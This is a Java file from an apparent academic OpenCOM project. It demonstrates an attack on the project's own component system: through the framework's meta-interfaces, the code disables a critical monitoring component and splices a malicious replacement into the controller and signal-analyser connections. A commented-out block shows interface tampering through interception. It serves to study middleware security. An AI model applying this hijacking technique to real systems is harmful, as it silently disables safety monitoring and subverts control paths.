package OpenCOM.Project;

import OpenCOM.Project.ControllerCaplet.MonitoringComponent.CriticalMonitoringComponent;
import OpenCOM.Project.ControllerCaplet.MonitoringComponent.IMonitoringComponent;
import OpenCOM.Project.TestProgram;
import OpenCOM.*;
import java.util.Vector;

public class Malicious {

    public static void main(OpenCOM runtime) {
        try {
            //OpenCOM runtime = TestProgram.getRuntime();
            //runtime = TestProgram.runtime;
            IOpenCOM pIOCM = (IOpenCOM) runtime.QueryInterface("OpenCOM.IOpenCOM");
            //IOpenCOM pIOCM = TestProgram.pIOCM;
            IUnknown pCriticalMonitoringComponentIUnk = pIOCM.getComponentPIUnknown("CriticalMonitoringComponent");

            IMetaInterface pMeta = (IMetaInterface) pCriticalMonitoringComponentIUnk.QueryInterface("OpenCOM.IMetaInterface");
            Vector<Class> ppIntf = new Vector<Class>();
            int len = pMeta.enumIntfs(ppIntf);
            System.out.println("Number of interfaces found: " + len);

            for (int i = 0; i < len; i++) {
                Class temp = ppIntf.elementAt(i);
                System.out.println(temp.toString());
                if (temp.toString().contains("MonitoringComponent")) {
                    System.out.println("\nCritical Monitoring Component found - hijacking...");
                    pMeta.SetAttributeValue("OpenCOM.Project.ControllerCaplet.MonitoringComponent.IMonitoringComponent",
                            "Interface", "Status", "String", "Disabled");
                }
            }

            // Create new malicious component

            IUnknown pMaliciousMonitoringComponentIUnk = (IUnknown) pIOCM.createInstance(
                    "OpenCOM.Project.MaliciousMonitoringComponent",
                    "MaliciousMonitoringComponent");
            ILifeCycle pILife =  (ILifeCycle) pMaliciousMonitoringComponentIUnk.QueryInterface("OpenCOM.ILifeCycle");
            pILife.startup(pIOCM);

            // Add new connections for malicious component

            IUnknown pSignalAnalyserComponentIUnk = pIOCM.getComponentPIUnknown("SignalAnalyserComponent");
            IUnknown pControllerOutboundStubIUnk = pIOCM.getComponentPIUnknown("ControllerOutboundStub");
            IUnknown pControllerInboundStubIUnk = pIOCM.getComponentPIUnknown("ControllerInboundStub");

            long maliciousMonitoringFromSignalAnalyser = runtime.connect(pMaliciousMonitoringComponentIUnk, pSignalAnalyserComponentIUnk, "OpenCOM.Project.ControllerCaplet.SignalAnalyserComponent.ISignalAnalyserComponent");
            long maliciousMonitoringFromControllerOutbound = runtime.connect(pMaliciousMonitoringComponentIUnk, pControllerOutboundStubIUnk, "OpenCOM.Project.ControllerCaplet.NetworkStubs.IControllerOutboundStub");
            long controllerOutboundFromMaliciousMonitoring = runtime.connect(pControllerOutboundStubIUnk,pMaliciousMonitoringComponentIUnk, "OpenCOM.Project.ControllerCaplet.MonitoringComponent.IMonitoringComponent");
            long signalAnalyserFromMaliciousMonitoring = runtime.connect(pSignalAnalyserComponentIUnk, pMaliciousMonitoringComponentIUnk, "OpenCOM.Project.ControllerCaplet.MonitoringComponent.IMonitoringComponent");
            long maliciousMonitoringFromControllerInbound = runtime.connect(pMaliciousMonitoringComponentIUnk,pControllerInboundStubIUnk, "OpenCOM.Project.ControllerCaplet.NetworkStubs.IControllerInboundStub");


        } catch (NullPointerException nullPointerException) {
            System.out.println(nullPointerException + " - Cannot find runtime");
        }
    }
}























/*       IMetaArchitecture pIMetaArch = (IMetaArchitecture) runtime.QueryInterface("OpenCOM.IMetaArchitecture");

        Vector<Long> list = new Vector<Long>();
        int NoConns = pIMetaArch.enumConnsToIntf(pSensorComponentIUnk, "OpenCOM.Project.SensorCaplet.SensorComponent.ISensorComponent", list);

        for (int index=0; index<NoConns; index++) {
            OCM_ConnInfo_t TempConnInfo = pIOCM.getConnectionInfo(list.get(index).longValue());
            System.out.println("Component" +
                                TempConnInfo.sinkComponentName + " is connected to " +
                                TempConnInfo.sourceComponentName + " on interface " +
                                TempConnInfo.interfaceType);
        }

        IUnknown pSensorComponent = pIOCM.getComponentPIUnknown("SensorComponent");
        IMetaInterception pMetaIntc = (IMetaInterception) pIOCM.QueryInterface("OpenCOM.IMetaInterception");
        IDelegator pDel = pMetaIntc.GetDelegator(pSensorComponent, "OpenCOM.Project.SensorCaplet.SensorComponent.ISensorComponent");

        pDel.SetAttributeValue("Malicious", "String", "Hacked");
*/
